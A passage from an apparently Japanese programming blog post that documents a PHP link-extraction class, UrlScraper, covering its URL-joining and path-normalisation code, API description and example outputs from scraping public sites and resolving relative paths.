        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match_all</span><span class="p">(</span><span class="nv">$regex</span><span class="p">,</span> <span class="nv">$html</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">,</span> <span class="nx">PREG_SET_ORDER</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nv">$array</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$matches</span> <span class="k">as</span> <span class="nv">$match</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">try</span> <span class="p">{</span>
                <span class="nv">$href</span> <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">join</span><span class="p">(</span><span class="nv">$p</span><span class="p">,</span> <span class="nx">self</span><span class="o">::</span><span class="na">parseUrl</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
                <span class="nv">$text</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nb">strip_tags</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">2</span><span class="p">]));</span>
                <span class="k">if</span> <span class="p">(</span>
                    <span class="nv">$text</span> <span class="o">!==</span> <span class="s1">''</span> <span class="o">&amp;&amp;</span>
                    <span class="nb">preg_match_all</span><span class="p">(</span><span class="s1">'@(?&lt;!\.)alt="([^"]++)"@'</span><span class="p">,</span> <span class="nv">$match</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$matches</span><span class="p">)</span>
                <span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$text</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">' - '</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
                <span class="p">}</span>
                <span class="nv">$set</span> <span class="o">=</span> <span class="nb">array_map</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="no">__CLASS__</span><span class="p">,</span> <span class="s1">'decode'</span><span class="p">),</span> <span class="nb">compact</span><span class="p">(</span><span class="s1">'href'</span><span class="p">,</span> <span class="s1">'text'</span><span class="p">));</span>
                <span class="nv">$array</span><span class="p">[</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$set</span><span class="p">)]</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span> <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nb">array_values</span><span class="p">(</span><span class="nv">$array</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">parseUrl</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$p</span> <span class="o">=</span> <span class="nb">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="k">or</span> <span class="nx">self</span><span class="o">::</span><span class="na">isJavaScript</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">InvalidArgumentException</span><span class="p">(</span><span class="s1">'Invalid URL'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$host</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="s1">'host'</span><span class="p">]))</span> <span class="p">{</span>
            <span class="nv">$host</span> <span class="o">.=</span> <span class="nv">$p</span><span class="p">[</span><span class="s1">'scheme'</span><span class="p">]</span> <span class="o">.</span> <span class="s1">'://'</span> <span class="o">.</span> <span class="nv">$p</span><span class="p">[</span><span class="s1">'host'</span><span class="p">];</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="s1">'port'</span><span class="p">]))</span> <span class="p">{</span>
                <span class="nv">$host</span> <span class="o">.=</span> <span class="s1">':'</span> <span class="o">.</span> <span class="nv">$p</span><span class="p">[</span><span class="s1">'port'</span><span class="p">];</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="nv">$path</span>     <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="s1">'path'</span><span class="p">])</span>     <span class="o">?</span> <span class="nv">$p</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]</span>           <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
        <span class="nv">$query</span>    <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="s1">'query'</span><span class="p">])</span>    <span class="o">?</span> <span class="s1">'?'</span> <span class="o">.</span> <span class="nv">$p</span><span class="p">[</span><span class="s1">'query'</span><span class="p">]</span>    <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
        <span class="nv">$fragment</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="s1">'fragment'</span><span class="p">])</span> <span class="o">?</span> <span class="s1">'#'</span> <span class="o">.</span> <span class="nv">$p</span><span class="p">[</span><span class="s1">'fragment'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
        <span class="k">return</span> <span class="nb">compact</span><span class="p">(</span><span class="s1">'host'</span><span class="p">,</span> <span class="s1">'path'</span><span class="p">,</span> <span class="s1">'query'</span><span class="p">,</span> <span class="s1">'fragment'</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">normalize</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$parts</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="nv">$segments</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'@/++@'</span><span class="p">,</span> <span class="s1">'/'</span><span class="p">,</span> <span class="nv">$path</span><span class="p">));</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$segments</span> <span class="k">as</span> <span class="nv">$segment</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$segment</span> <span class="o">===</span> <span class="s1">'.'</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">continue</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="k">null</span> <span class="o">===</span> <span class="nv">$tail</span> <span class="o">=</span> <span class="nb">array_pop</span><span class="p">(</span><span class="nv">$parts</span><span class="p">))</span> <span class="p">{</span>
                <span class="nv">$parts</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$segment</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$segment</span> <span class="o">===</span> <span class="s1">'..'</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$tail</span> <span class="o">===</span> <span class="s1">'..'</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$parts</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$tail</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$tail</span> <span class="o">===</span> <span class="s1">'..'</span> <span class="o">||</span> <span class="nv">$tail</span> <span class="o">===</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$parts</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$segment</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nv">$parts</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$tail</span><span class="p">;</span>
                <span class="nv">$parts</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$segment</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="nv">$parts</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="nv">$parts</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">isAbsolute</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$parts</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'@^(?:\.{2}/)++@'</span><span class="p">,</span> <span class="s1">'/'</span><span class="p">,</span> <span class="nv">$parts</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$parts</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">join</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="nv">$b</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">self</span><span class="o">::</span><span class="na">isAbsolute</span><span class="p">(</span><span class="nv">$b</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]))</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$b</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]</span> <span class="o">===</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$b</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">[</span><span class="s1">'path'</span><span class="p">];</span>
            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$b</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="nb">array_merge</span><span class="p">(</span>
                    <span class="nb">array_slice</span><span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="nv">$a</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]),</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">),</span>
                    <span class="k">array</span><span class="p">(</span><span class="s1">'.'</span><span class="p">,</span> <span class="nv">$b</span><span class="p">[</span><span class="s1">'path'</span><span class="p">])</span>
                <span class="p">));</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="nv">$b</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">normalize</span><span class="p">(</span><span class="nv">$b</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]);</span>
        <span class="k">if</span> <span class="p">(</span>
            <span class="nv">$a</span><span class="p">[</span><span class="s1">'host'</span><span class="p">]</span>  <span class="o">===</span> <span class="nv">$b</span><span class="p">[</span><span class="s1">'host'</span><span class="p">]</span> <span class="o">||</span> <span class="nv">$b</span><span class="p">[</span><span class="s1">'host'</span><span class="p">]</span> <span class="o">===</span> <span class="s1">''</span> <span class="k">and</span>
            <span class="nv">$a</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]</span>  <span class="o">===</span> <span class="nv">$b</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]</span>                      <span class="k">and</span>
            <span class="nv">$a</span><span class="p">[</span><span class="s1">'query'</span><span class="p">]</span> <span class="o">===</span> <span class="nv">$b</span><span class="p">[</span><span class="s1">'query'</span><span class="p">]</span>
        <span class="p">)</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="nv">$host</span> <span class="o">=</span> <span class="nv">$b</span><span class="p">[</span><span class="s1">'host'</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">''</span> <span class="o">?</span> <span class="nv">$b</span><span class="p">[</span><span class="s1">'host'</span><span class="p">]</span> <span class="o">:</span> <span class="nv">$a</span><span class="p">[</span><span class="s1">'host'</span><span class="p">];</span>
        <span class="k">return</span> <span class="nv">$host</span> <span class="o">.</span> <span class="nv">$b</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$b</span><span class="p">[</span><span class="s1">'query'</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$b</span><span class="p">[</span><span class="s1">'fragment'</span><span class="p">];</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">isAbsolute</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="s1">'/'</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">isJavaScript</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nb">stripos</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="s1">'javascript:'</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">decode</span><span class="p">(</span><span class="nv">$html</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nb">html_entity_decode</span><span class="p">(</span><span class="nv">$html</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
    <span class="p">}</span>

<span class="p">}</span>
</pre></div></div>

<h2>
<span id="使い方" class="fragment"></span><a href="#%E4%BD%BF%E3%81%84%E6%96%B9"><i class="fa fa-link"></i></a>使い方</h2>

<h3>
<span id="説明" class="fragment"></span><a href="#%E8%AA%AC%E6%98%8E"><i class="fa fa-link"></i></a>説明</h3>

<p>HTML内に存在する外部へのURLリンクを抽出します。エンコーディングは <strong>UTF-8</strong> 前提なので、他のケースでは前に <strong>mb_convert_encoding</strong> 関数などを使って変換しておく必要があります。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">public</span> <span class="k">static</span> <span class="k">array</span> <span class="nx">UrlScraper</span><span class="o">::</span><span class="na">parseLinks</span> <span class="p">(</span> <span class="nx">string</span> <span class="nv">$html</span> <span class="p">[</span> <span class="p">,</span> <span class="nx">string</span> <span class="nv">$base_href</span> <span class="o">=</span> <span class="s2">""</span> <span class="p">]</span> <span class="p">)</span>
</pre></div></div>

<h3>
<span id="パラメータ" class="fragment"></span><a href="#%E3%83%91%E3%83%A9%E3%83%A1%E3%83%BC%E3%82%BF"><i class="fa fa-link"></i></a>パラメータ</h3>

<ul>
<li>
<strong><em>$html</em></strong><br>HTMLソース。</li>
<li>
<strong><em>[$base_href]</em></strong><br>起点にするURLまたはパス。BASE要素・HREF属性の実装に従う。</li>
</ul>

<h3>
<span id="返り値" class="fragment"></span><a href="#%E8%BF%94%E3%82%8A%E5%80%A4"><i class="fa fa-link"></i></a>返り値</h3>

<p><strong><code>href</code></strong> をURL、 <strong><code>text</code></strong> をURLが張られたテキストとする連想配列の配列を返します。</p>

<h3>
<span id="注意点" class="fragment"></span><a href="#%E6%B3%A8%E6%84%8F%E7%82%B9"><i class="fa fa-link"></i></a>注意点</h3>

<ul>
<li>
<code>href</code> <code>text</code> がユニークでないものは無視されます。</li>
<li>
<code>javascript:</code> は無視されます。</li>
<li>ページ内リンクは無視されます。</li>
<li>同一ページでもクエリが異なる場合は無視しません。</li>
<li>URLが張られた部分のHTMLタグ除去後にトリミングして空文字列となったときは、そこに存在する <strong>alt</strong> 属性の値を自動的に検知して割り当てます。複数あった場合は <strong><code>-</code></strong> で連結されます。</li>
</ul>

<h1>
<span id="使用例" class="fragment"></span><a href="#%E4%BD%BF%E7%94%A8%E4%BE%8B"><i class="fa fa-link"></i></a>使用例</h1>

<h2>
<span id="首相官邸のページを取得してみる" class="fragment"></span><a href="#%E9%A6%96%E7%9B%B8%E5%AE%98%E9%82%B8%E3%81%AE%E3%83%9A%E3%83%BC%E3%82%B8%E3%82%92%E5%8F%96%E5%BE%97%E3%81%97%E3%81%A6%E3%81%BF%E3%82%8B"><i class="fa fa-link"></i></a>首相官邸のページを取得してみる</h2>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">コード</span></div>
<div class="highlight"><pre><span></span><span class="nv">$url</span> <span class="o">=</span> <span class="s1">'http://www.kantei.go.jp/sitemap.html'</span><span class="p">;</span>
<span class="nb">print_r</span><span class="p">(</span><span class="nx">UrlScraper</span><span class="o">::</span><span class="na">parseLinks</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$url</span><span class="p">),</span> <span class="nv">$url</span><span class="p">));</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">結果</span></div>
<div class="highlight"><pre><span></span>Array
(

    [0] =&gt; Array
        (
            [href] =&gt; http://www.kantei.go.jp/
            [text] =&gt; 首相官邸 Prime Minister of Japan and His Cabinet
        )

    [1] =&gt; Array
        (
            [href] =&gt; http://www.kantei.go.jp/foreign/index-e.html
            [text] =&gt; English
        )

    [2] =&gt; Array
        (
            [href] =&gt; http://www.kantei.go.jp/cn/index.html
            [text] =&gt; 中文
        )

    ...(中略)...

    [49] =&gt; Array
        (
            [href] =&gt; http://www.kantei.go.jp/rss.html
            [text] =&gt; RSS配信について
        )

    [50] =&gt; Array
        (
            [href] =&gt; http://www.kantei.go.jp/webaccessibility.html
            [text] =&gt; Webアクセシビリティ
        )

    [51] =&gt; Array
        (
            [href] =&gt; http://www.kantei.go.jp/jp/terms.html
            [text] =&gt; リンク・著作権等について
        )

)
</pre></div>
</div>

<h2>
<span id="yahoojapanトップページを取得してみる" class="fragment"></span><a href="#yahoojapan%E3%83%88%E3%83%83%E3%83%97%E3%83%9A%E3%83%BC%E3%82%B8%E3%82%92%E5%8F%96%E5%BE%97%E3%81%97%E3%81%A6%E3%81%BF%E3%82%8B"><i class="fa fa-link"></i></a>Yahoo!JAPANトップページを取得してみる</h2>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">コード</span></div>
<div class="highlight"><pre><span></span><span class="nv">$html</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'http://www.yahoo.co.jp'</span><span class="p">);</span>
<span class="nb">preg_match</span><span class="p">(</span><span class="s1">'@&lt;base href="([^"]*+)"&gt;@'</span><span class="p">,</span> <span class="nv">$html</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">);</span>
<span class="nb">print_r</span><span class="p">(</span><span class="nx">UrlScraper</span><span class="o">::</span><span class="na">parseLinks</span><span class="p">(</span><span class="nv">$html</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">結果</span></div>
<div class="highlight"><pre><span></span>Array
(

    ...

    [3] =&gt; Array
        (
            [href] =&gt; http://www.yahoo.co.jp/_ylh=XfarSdeAxqBF9TAzIwNzkxODE5OTkEdGlkAzEzBHRtcGwDdGFibGU-/r/c2
            [text] =&gt; ヤフオク!
        )

    [4] =&gt; Array
        (
            [href] =&gt; http://www.yahoo.co.jp/_ylh=XfarSdeAxqBF9TAzIwNzkxODE5OTkEdGlkAzEzBHRtcGwDdGFibGU-/r/c5
            [text] =&gt; 旅行、ホテル予約
        )

    [5] =&gt; Array
        (
            [href] =&gt; http://www.yahoo.co.jp/_ylh=XfarSdeAxqBF9TAzIwNzkxODE5OTkEdGlkAzEzBHRtcGwDdGFibGU-/r/c12
            [text] =&gt; ニュース
        )

    [6] =&gt; Array
        (
            [href] =&gt; http://www.yahoo.co.jp/_ylh=XfarSdeAxqBF9TAzIwNzkxODE5OTkEdGlkAzEzBHRtcGwDdGFibGU-/r/c13
            [text] =&gt; 天気
        )

    ...

)
</pre></div>
</div>

<h2>
<span id="相対パスに関するデモンストレーション" class="fragment"></span><a href="#%E7%9B%B8%E5%AF%BE%E3%83%91%E3%82%B9%E3%81%AB%E9%96%A2%E3%81%99%E3%82%8B%E3%83%87%E3%83%A2%E3%83%B3%E3%82%B9%E3%83%88%E3%83%AC%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3"><i class="fa fa-link"></i></a>相対パスに関するデモンストレーション</h2>

<h3>
<span id="サンプル1-ベースに初期値を指定" class="fragment"></span><a href="#%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB1-%E3%83%99%E3%83%BC%E3%82%B9%E3%81%AB%E5%88%9D%E6%9C%9F%E5%80%A4%E3%82%92%E6%8C%87%E5%AE%9A"><i class="fa fa-link"></i></a>サンプル1: ベースに初期値を指定</h3>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">コード</span></div>
<div class="highlight"><pre><span></span><span class="nv">$html</span> <span class="o">=</span> <span class="s">&lt;&lt;&lt;'</span><span class="dl">EOD</span><span class="s">'</span>
<span class="s">&lt;a href="?q=php"&gt;?q=php&lt;/a&gt;</span>
<span class="s">&lt;a href="./?q=php"&gt;./?q=php&lt;/a&gt;</span>
<span class="s">&lt;a href="../?q=php"&gt;../?q=php&lt;/a&gt;</span>
<span class="s">&lt;a href="/?q=php"&gt;/?q=php&lt;/a&gt;</span>
<span class="s">&lt;a href="#php"&gt;#php&lt;/a&gt;</span>
<span class="s">&lt;a href="./#php"&gt;./#php&lt;/a&gt;</span>
<span class="s">&lt;a href="../#php"&gt;../#php&lt;/a&gt;</span>
<span class="s">&lt;a href="/#php"&gt;/#php&lt;/a&gt;</span>
<span class="dl">EOD</span><span class="p">;</span>

<span class="nb">print_r</span><span class="p">(</span><span class="nx">UrlScraper</span><span class="o">::</span><span class="na">parseLinks</span><span class="p">(</span><span class="nv">$html</span><span class="p">,</span> <span class="s1">''</span><span class="p">));</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">結果</span></div>
<div class="highlight"><pre><span></span>Array
(
    [0] =&gt; Array
        (
            [href] =&gt; ?q=php
            [text] =&gt; ?q=php
        )

    [1] =&gt; Array
        (
            [href] =&gt; ?q=php
            [text] =&gt; ./?q=php
        )

    [2] =&gt; Array
        (
            [href] =&gt; ../?q=php
            [text] =&gt; ../?q=php
        )

    [3] =&gt; Array
        (
            [href] =&gt; /?q=php
            [text] =&gt; /?q=php
        )

    [4] =&gt; Array
        (
            [href] =&gt; ../#php
            [text] =&gt; ../#php
        )

    [5] =&gt; Array
        (
            [href] =&gt; /#php
            [text] =&gt; /#php
        )

)
</pre></div>
</div>

<h3>
<span id="サンプル2-ベースにファイルへの相対パスを指定" class="fragment"></span><a href="#%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB2-%E3%83%99%E3%83%BC%E3%82%B9%E3%81%AB%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%B8%E3%81%AE%E7%9B%B8%E5%AF%BE%E3%83%91%E3%82%B9%E3%82%92%E6%8C%87%E5%AE%9A"><i class="fa fa-link"></i></a>サンプル2: ベースにファイルへの相対パスを指定</h3>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">コード</span></div>
<div class="highlight"><pre><span></span><span class="nv">$html</span> <span class="o">=</span> <span class="s">&lt;&lt;&lt;'</span><span class="dl">EOD</span><span class="s">'</span>
<span class="s">&lt;a href="?q=php"&gt;?q=php&lt;/a&gt;</span>
<span class="s">&lt;a href="./?q=php"&gt;./?q=php&lt;/a&gt;</span>
<span class="s">&lt;a href="../?q=php"&gt;../?q=php&lt;/a&gt;</span>
<span class="s">&lt;a href="/?q=php"&gt;/?q=php&lt;/a&gt;</span>
<span class="s">&lt;a href="#php"&gt;#php&lt;/a&gt;</span>
<span class="s">&lt;a href="./#php"&gt;./#php&lt;/a&gt;</span>
<span class="s">&lt;a href="../#php"&gt;../#php&lt;/a&gt;</span>
<span class="s">&lt;a href="/#php"&gt;/#php&lt;/a&gt;</span>
<span class="dl">EOD</span><span class="p">;</span>

<span class="nb">print_r</span><span class="p">(</span><span class="nx">UrlScraper</span><span class="o">::</span><span class="na">parseLinks</span><span class="p">(</span><span class="nv">$html</span><span class="p">,</span> <span class="s1">'foo/bar'</span><span class="p">));</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">結果</span></div>
<div class="highlight"><pre><span></span>Array
(
    [0] =&gt; Array
        (
            [href] =&gt; foo/bar?q=php
            [text] =&gt; ?q=php
        )

    [1] =&gt; Array
        (
            [href] =&gt; foo/?q=php
            [text] =&gt; ./?q=php
        )

    [2] =&gt; Array
        (
            [href] =&gt; ?q=php
            [text] =&gt; ../?q=php
        )

    [3] =&gt; Array
        (
            [href] =&gt; /?q=php
            [text] =&gt; /?q=php
        )

    [4] =&gt; Array
        (
            [href] =&gt; foo/#php
            [text] =&gt; ./#php
        )

    [5] =&gt; Array
        (
            [href] =&gt; #php
            [text] =&gt; ../#php
        )

    [6] =&gt; Array
        (
            [href] =&gt; /#php
            [text] =&gt; /#php
        )

)
</pre></div>
</div>

<h3>
<span id="サンプル3-ベースにディレクトリへの相対パスを指定" class="fragment"></span><a href="#%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB3-%E3%83%99%E3%83%BC%E3%82%B9%E3%81%AB%E3%83%87%E3%82%A3%E3%83%AC%E3%82%AF%E3%83%88%E3%83%AA%E3%81%B8%E3%81%AE%E7%9B%B8%E5%AF%BE%E3%83%91%E3%82%B9%E3%82%92%E6%8C%87%E5%AE%9A"><i class="fa fa-link"></i></a>サンプル3: ベースにディレクトリへの相対パスを指定</h3>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">コード</span></div>
<div class="highlight"><pre><span></span><span class="nv">$html</span> <span class="o">=</span> <span class="s">&lt;&lt;&lt;'</span><span class="dl">EOD</span><span class="s">'</span>
<span class="s">&lt;a href="?q=php"&gt;?q=php&lt;/a&gt;</span>
<span class="s">&lt;a href="./?q=php"&gt;./?q=php&lt;/a&gt;</span>
<span class="s">&lt;a href="../?q=php"&gt;../?q=php&lt;/a&gt;</span>
<span class="s">&lt;a href="/?q=php"&gt;/?q=php&lt;/a&gt;</span>
<span class="s">&lt;a href="#php"&gt;#php&lt;/a&gt;</span>
<span class="s">&lt;a href="./#php"&gt;./#php&lt;/a&gt;</span>
<span class="s">&lt;a href="../#php"&gt;../#php&lt;/a&gt;</span>
<span class="s">&lt;a href="/#php"&gt;/#php&lt;/a&gt;</span>
<span class="dl">EOD</span><span class="p">;</span>

<span class="nb">print_r</span><span class="p">(</span><span class="nx">UrlScraper</span><span class="o">::</span><span class="na">parseLinks</span><span class="p">(</span><span class="nv">$html</span><span class="p">,</span> <span class="s1">'foo/bar/'</span><span class="p">));</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">結果</span></div>
<div class="highlight"><pre><span></span>Array
(
    [0] =&gt; Array
        (
            [href] =&gt; foo/bar/?q=php
            [text] =&gt; ?q=php
        )

    [1] =&gt; Array
        (
            [href] =&gt; foo/bar/?q=php
            [text] =&gt; ./?q=php
        )

    [2] =&gt; Array
        (
            [href] =&gt; foo/?q=php
            [text] =&gt; ../?q=php
        )

    [3] =&gt; Array
        (
            [href] =&gt; /?q=php
            [text] =&gt; /?q=php
        )

    [4] =&gt; Array
        (
            [href] =&gt; foo/#php
            [text] =&gt; ../#php
        )

    [5] =&gt; Array
        (
            [href] =&gt; /#php
            [text] =&gt; /#php
        )

)
</pre></div>
</div>

<h3>
<span id="サンプル4-ベースにファイルへの絶対パスを指定" class="fragment"></span><a href="#%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB4-%E3%83%99%E3%83%BC%E3%82%B9%E3%81%AB%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%B8%E3%81%AE%E7%B5%B6%E5%AF%BE%E3%83%91%E3%82%B9%E3%82%92%E6%8C%87%E5%AE%9A"><i class="fa fa-link"></i></a>サンプル4: ベースにファイルへの絶対パスを指定</h3>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">コード</span></div>
<div class="highlight"><pre><span></span><span class="nv">$html</span> <span class="o">=</span> <span class="s">&lt;&lt;&lt;'</span><span class="dl">EOD</span><span class="s">'</span>
<span class="s">&lt;a href="?q=php"&gt;?q=php&lt;/a&gt;</span>
<span class="s">&lt;a href="./?q=php"&gt;./?q=php&lt;/a&gt;</span>
<span class="s">&lt;a href="../?q=php"&gt;../?q=php&lt;/a&gt;</span>
<span class="s">&lt;a href="/?q=php"&gt;/?q=php&lt;/a&gt;</span>
<span class="s">&lt;a href="#php"&gt;#php&lt;/a&gt;</span>
<span class="s">&lt;a href="./#php"&gt;./#php&lt;/a&gt;</span>
<span class="s">&lt;a href="../#php"&gt;../#php&lt;/a&gt;</span>
<span class="s">&lt;a href="/#php"&gt;/#php&lt;/a&gt;</span>
<span class="dl">EOD</span><span class="p">;</span>

